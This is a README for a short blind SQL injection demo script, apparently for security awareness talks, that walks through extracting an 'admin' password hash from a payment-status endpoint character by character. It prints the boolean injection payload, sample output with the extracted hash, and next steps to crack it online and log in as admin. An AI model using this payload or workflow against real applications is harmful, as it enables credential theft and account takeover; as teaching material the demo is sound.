# Simple Blind SQLi Demo Script

## Quick Start

```bash
# Run the exploit
python3 exploit_blind_sqli.py
```

## What It Does

This script demonstrates automated blind SQL injection in 3 simple steps:

### Step 1: Login
Logs in as a regular user (alice)

### Step 2: Test Vulnerability
Tests if blind SQLi works with `1=1` (TRUE)

### Step 3: Extract Hash
Extracts admin password hash character by character:
- Tests each character (0-9, a-f)
- Shows real-time progress
- Displays the growing hash

## Example Output

```
============================================================
  BLIND SQL INJECTION - Simple Demo
============================================================

[1] Logging in as alice...
    ✓ Logged in

[2] Testing blind SQL injection...
    ✓ Vulnerability confirmed!

[3] Extracting password hash for 'admin'...
    (This tests each character 0-9, a-f)

    Position  1: 'c' ✓ → c
    Position  2: '5' ✓ → c5
    Position  3: '3' ✓ → c53
    Position  4: 'e' ✓ → c53e
    Position  5: '4' ✓ → c53e4
    ...
    Position 32: '0' ✓ → c53e479b03b3220d3d56da88c4cace20

============================================================
[+] EXTRACTED HASH: c53e479b03b3220d3d56da88c4cace20
============================================================

Next steps:
  1. Crack hash at: https://crackstation.net/
  2. Result: P@$$w0rd
  3. Login as admin with cracked password
```

## How It Works

For each character position (1-32):
```python
# Test if character is 'c'
/status?id=1 AND (SELECT SUBSTRING(password_hash, 1, 1) FROM users WHERE username='admin') = 'c'

If payment details shown → character is 'c' ✓
If "Payment Not Found" → try next character
```

## Total Time

- ~2-5 minutes depending on network speed
- ~512 HTTP requests (32 positions × 16 hex chars average)

## Demo Tips

1. **Show the URL being tested**: Add `-v` flag to see requests
2. **Pause after each character**: Add `time.sleep(0.5)` in the loop
3. **Explain the TRUE/FALSE**: Point out payment details vs "not found"
4. **Show CrackStation**: Have it ready in a browser tab

## Customization

Change the target user:
```python
TARGET_USER = "bob"  # Instead of "admin"
```

## Perfect For

- ✅ Quick demonstrations (< 5 minutes)
- ✅ Live presentations
- ✅ Security awareness training
- ✅ Showing automation risks

## Code Explanation

The entire script is ~70 lines with no functions - just linear steps that are easy to follow during a demo!
